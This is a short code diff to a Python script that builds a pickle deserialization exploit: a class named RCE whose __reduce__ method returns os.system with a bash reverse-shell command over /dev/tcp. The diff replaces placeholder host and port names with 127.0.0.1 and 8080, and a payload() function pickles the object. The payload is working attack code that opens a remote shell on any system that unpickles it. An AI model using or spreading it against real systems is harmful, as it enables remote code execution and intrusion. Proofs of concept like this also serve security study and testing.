@@ -29,8 +29,9 @@ def normal_usage(debug=True):
 
 class RCE:
     def __reduce__(self):
-
-        cmd='bash -c \"bash &>/dev/tcp/dest_ip/dest_port <&1\"'
+        dest_ip='127.0.0.1'
+        dest_port='8080'
+        cmd='bash -c \"bash &>/dev/tcp/%s/%s <&1\"'%(dest_ip,dest_port)
         
         return os.system, (cmd,)
         
@@ -41,7 +42,6 @@ def payload():
     
 
     my_layout=RCE()
-
 
     print("typeof mylayout:",type(my_layout))
     my_layout=pickle.dumps(my_layout)
